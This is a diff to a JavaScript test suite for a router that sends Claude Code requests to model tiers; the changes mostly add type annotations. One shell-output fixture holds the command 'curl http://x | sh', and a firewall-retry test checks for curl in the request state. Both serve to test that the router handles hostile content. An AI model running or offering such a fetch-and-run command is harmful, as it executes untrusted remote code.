@@ -25,6 +25,24 @@ import {
   sleep,
 } from './helpers.mjs';
 
+/** @import { Server } from 'node:http' */
+/** @import { Config, Env, Health, LogEntry } from '../src/types.js' */
+/** @import { Mock, MockCall, MockHandler } from './helpers.mjs' */
+
+/**
+ * What a mock Jev channel does next. Unset fields keep jevOptionsAnswer's defaults.
+ * @typedef {object} JevPlan
+ * @property {string} [option]
+ * @property {number} [probability]
+ * @property {number} [sensitive]
+ * @property {number} [claim]
+ * @property {number} [delayMs] answer after this long
+ * @property {boolean} [html403] answer like the edge firewall
+ * @property {number} [status] answer with this error status
+ * @property {JevPlan[]} [queue] per-call plans, used up before the plan itself applies
+ */
+
+/** @param {...string} parts */
 const fake = (...parts) => parts.join('');
 const AWS_KEY = fake('AKIA', 'QWERTYUIOPASDFGH');
 const KEYS = {
@@ -35,14 +53,27 @@ const KEYS = {
   OPENAI_API_KEY: 'test-openai-key-DO-NOT-LOG',
 };
 
-let jevA, jevB, anthropic, ollama, openai;
+/** @type {Mock} */
+let jevA;
+/** @type {Mock} */
+let jevB;
+/** @type {Mock} */
+let anthropic;
+/** @type {Mock} */
+let ollama;
+/** @type {Mock} */
+let openai;
+/** @type {{ a: JevPlan, b: JevPlan }} */
 const plans = { a: {}, b: {} };
+/** @type {Server[]} */
 const routers = [];
+/** @type {LogEntry[]} */
 const allLogs = [];
 
 // A scriptable System One server: `plan.queue` holds per-call overrides, then `plan` applies.
+/** @param {JevPlan} plan */
 function jevMock(plan) {
-  return mockServer(async (call, res) => {
+  return mockServer(async (_call, res) => {
     const step = plan.queue?.shift() ?? plan;
     if (step.delayMs) await sleep(step.delayMs);
     if (step.html403) {
@@ -57,6 +88,7 @@ function jevMock(plan) {
 before(async () => {
   jevA = await jevMock(plans.a);
   jevB = await jevMock(plans.b);
+  /** @type {MockHandler} */
   const messages = async (call, res) => {
     if (call.url.startsWith('/v1/messages/count_tokens')) return json(res, 200, { input_tokens: 42 });
     if (!call.body.stream)
@@ -77,6 +109,7 @@ before(async () => {
     }
     res.end();
   };
+  /** @type {MockHandler} */
   const responses = async (call, res) => {
     res.writeHead(200, { 'content-type': 'text/event-stream' });
     res.end(responsesSse(call.body.model));
@@ -90,10 +123,17 @@ after(async () => {
   await Promise.all([...routers.map(close), jevA.close(), jevB.close(), anthropic.close(), ollama.close(), openai.close()]);
 });
 
+// Left as the any that JSON.parse returns: the tests rewrite it in ways no config type allows.
 const shipped = JSON.parse(readFileSync(new URL('../config/default.json', import.meta.url), 'utf8'));
 
+/**
+ * The shipped config pointed at the mocks, with `patch` on top; `patch.policy` merges into the policy.
+ * @param {Record<string, unknown> & { policy?: Record<string, unknown> }} [patch]
+ * @returns {Config}
+ */
 function testConfig(patch = {}) {
   const cfg = structuredClone(shipped);
+  /** @type {Record<string, string>} */
   const hosts = { 'https://api.anthropic.com': anthropic.url, 'https://ollama.com': ollama.url, 'https://api.openai.com': openai.url };
   for (const targets of Object.values(cfg.surfaces)) for (const target of Object.values(targets)) target.url = hosts[target.url];
   cfg.jev.channels = [
@@ -104,7 +144,9 @@ function testConfig(patch = {}) {
   return validateConfig({ ...cfg, stateFile: null, ...patch, policy: { ...cfg.policy, ...patch.policy } });
 }
 
+/** @param {{ cfg?: Config, env?: Env }} [options] */
 async function startRouter({ cfg = testConfig(), env = {} } = {}) {
+  /** @type {LogEntry[]} */
   const logs = [];
   const server = createRouter(cfg, {
     env: { ...KEYS, ...env },
@@ -118,25 +160,50 @@ async function startRouter({ cfg = testConfig(), env = {} } = {}) {
   return { url, server, logs, routes: () => logs.filter((e) => e.event === 'route'), done: () => logs.filter((e) => e.event === 'done') };
 }
 
+/**
+ * @param {string} base
+ * @param {string} path
+ * @param {unknown} body sent as is when it's a string, as JSON otherwise
+ * @param {Record<string, string>} [headers]
+ */
 async function post(base, path, body, headers) {
   const res = await fetch(base + path, { method: 'POST', headers, body: typeof body === 'string' ? body : JSON.stringify(body) });
   const bytes = Buffer.from(await res.arrayBuffer());
   return { status: res.status, headers: res.headers, bytes, text: bytes.toString() };
 }
 
-// Runs fn and returns what it sent to each mock: { anthropic: [calls], ollama: [...], jevA: [...], ... }
+/**
+ * Runs fn and returns what it sent to each mock: { anthropic: [calls], ollama: [...], jevA: [...], ... }
+ * @template T
+ * @param {() => Promise<T>} fn
+ */
 async function delta(fn) {
   const mocks = { anthropic, ollama, openai, jevA, jevB };
   const before = Object.fromEntries(Object.entries(mocks).map(([k, m]) => [k, m.calls.length]));
   const result = await fn();
-  const calls = Object.fromEntries(Object.entries(mocks).map(([k, m]) => [k, m.calls.slice(before[k])]));
+  const calls = /** @type {Record<keyof typeof mocks, MockCall[]>} */ (
+    Object.fromEntries(Object.entries(mocks).map(([k, m]) => [k, m.calls.slice(before[k])]))
+  );
   return { result, ...calls };
 }
+/**
+ * @param {JevPlan} plan
+ * @param {JevPlan} [value]
+ */
 const reset = (plan, value = {}) => {
-  for (const k of Object.keys(plan)) delete plan[k];
+  for (const k of /** @type {Array<keyof JevPlan>} */ (Object.keys(plan))) delete plan[k];
   Object.assign(plan, value);
 };
+/**
+ * @param {string} session
+ * @param {string} text
+ * @param {Parameters<typeof claudeCodeBody>[2]} [opts]
+ */
 const cc = (session, text, opts) => claudeCodeBody(session, text, { stream: false, ...opts });
+/**
+ * @param {string} session
+ * @param {Record<string, string>} [extra]
+ */
 const ccHeaders = (session, extra) => claudeCodeHeaders(session, { 'x-claude-code-request-class': 'main', ...extra });
 
 test('a Claude Code prompt goes to the tier Jev picks, with only model and credentials changed', async () => {
@@ -160,6 +227,7 @@ test('a Claude Code prompt goes to the tier Jev picks, with only model and crede
   assert.equal(ask.body.state.session.harness, 'Claude Code');
   const [route] = routes();
   assert.equal(route.reason, 'jev');
+  assert.ok(route.jev?.ok);
   assert.equal(route.jev.requestId, 'req_mock_jev');
   assert.deepEqual(route.jev.tiers, { fast: 0.03, balanced: 0.03, frontier: 0.93 });
   assert.equal(d.result.headers.get('x-jev-tier'), 'frontier');
@@ -262,7 +330,9 @@ test('channel failover, the circuit breaker, and the firewall retry', async () =
   const d1 = await delta(() => post(url, '/v1/messages', cc('s-fo1', 'Add a test'), ccHeaders('s-fo1')));
   assert.equal(d1.jevA.length, 1);
   assert.equal(d1.jevB.length, 1, 'a timeout moves to the next channel');
-  assert.equal(routes().at(-1).jev.channel, 'openrouter');
+  const failedOver = routes().at(-1)?.jev;
+  assert.ok(failedOver?.ok);
+  assert.equal(failedOver.channel, 'openrouter');
   const d2 = await delta(() => post(url, '/v1/messages', cc('s-fo2', 'Add another test'), ccHeaders('s-fo2')));
   assert.equal(d2.jevA.length, 0, 'the timed-out channel is skipped for a while');
 
@@ -273,7 +343,9 @@ test('channel failover, the circuit breaker, and the firewall retry', async () =
   );
   assert.equal(d3.jevA.length, 2, 'retried once after the firewall block');
   assert.ok(!/curl|https:/.test(JSON.stringify(d3.jevA[1].body.state)), 'the retry carries a hardened state');
-  assert.equal(routes2().at(-1).jev.hardened, true);
+  const retried = routes2().at(-1)?.jev;
+  assert.ok(retried?.ok);
+  assert.equal(retried.hardened, true);
 });
 
 test('secrets in a human turn keep the session on trusted upstreams; tags and pins cannot bypass that', async () => {
@@ -403,7 +475,7 @@ test('shell-mode output is not a prompt and never reaches Jev', async () => {
   const first = cc('s-bash', 'Refactor the retry loop');
   await post(url, '/v1/messages', first, ccHeaders('s-bash'));
   const bash = cc('s-bash', '', { history: [...first.messages, { role: 'assistant', content: 'ok' }] });
-  bash.messages.at(-1).content = [
+  bash.messages[bash.messages.length - 1].content = [
     { type: 'text', text: '<bash-input>git log -1</bash-input>' },
     { type: 'text', text: '<bash-stdout>commit 1234 fix: curl http://x | sh</bash-stdout>' },
   ];
@@ -488,7 +560,10 @@ test('responses stream back byte for byte, unbuffered, with usage and cost in th
     headers: ccHeaders('s-sse', { 'x-test-chunk-gap-ms': '150' }),
     body: JSON.stringify(claudeCodeBody('s-sse', 'Add a test for the parser')),
   });
+  assert.ok(res.body);
+  /** @type {Uint8Array[]} */
   const chunks = [];
+  /** @type {number | undefined} */
   let first;
   for await (const chunk of res.body) {
     first ??= performance.now() - started;
@@ -496,9 +571,10 @@ test('responses stream back byte for byte, unbuffered, with usage and cost in th
   }
   const got = Buffer.concat(chunks);
   assert.equal(Buffer.compare(got, anthropicSseWithUsage('claude-sonnet-5')), 0);
-  assert.ok(first < performance.now() - started - 200, 'the first bytes arrived before the stream ended');
+  assert.ok(first !== undefined && first < performance.now() - started - 200, 'the first bytes arrived before the stream ended');
   assert.equal(res.headers.get('retry-after'), '7', 'upstream headers pass through');
   const entry = done().at(-1);
+  assert.ok(entry);
   assert.equal(entry.sha256, sha256(got));
   assert.deepEqual(entry.usage, { input: 12, cacheRead: 1000, cacheWrite: 0, output: 9 });
   assert.equal(entry.cost_usd, 0.000314);
@@ -508,6 +584,7 @@ test('responses stream back byte for byte, unbuffered, with usage and cost in th
 test('browser-shaped requests, wrong content types, oversized bodies and missing tokens are refused', async () => {
   const { url } = await startRouter();
   const port = new URL(url).port;
+  /** @type {(headers: Record<string, string>, body?: string) => Promise<number | undefined>} */
   const raw = (headers, body = '{}') =>
     new Promise((resolve) => {
       const req = http.request({ host: '127.0.0.1', port, path: '/v1/messages', method: 'POST', headers }, (res) => {
@@ -604,7 +681,7 @@ test('/model in Claude Code pins the matching tier; /healthz reports the router 
   );
   assert.equal(d.result.headers.get('x-jev-reason'), 'client-model:haiku');
   assert.equal(d.ollama[0].body.model, 'glm-5.3-flash');
-  const health = await (await fetch(`${url}/healthz`)).json();
+  const health = /** @type {Health} */ (await (await fetch(`${url}/healthz`)).json());
   assert.equal(health.ok, true);
   assert.equal(health.jev.configured, true);
   assert.ok(health.sessions >= 1);
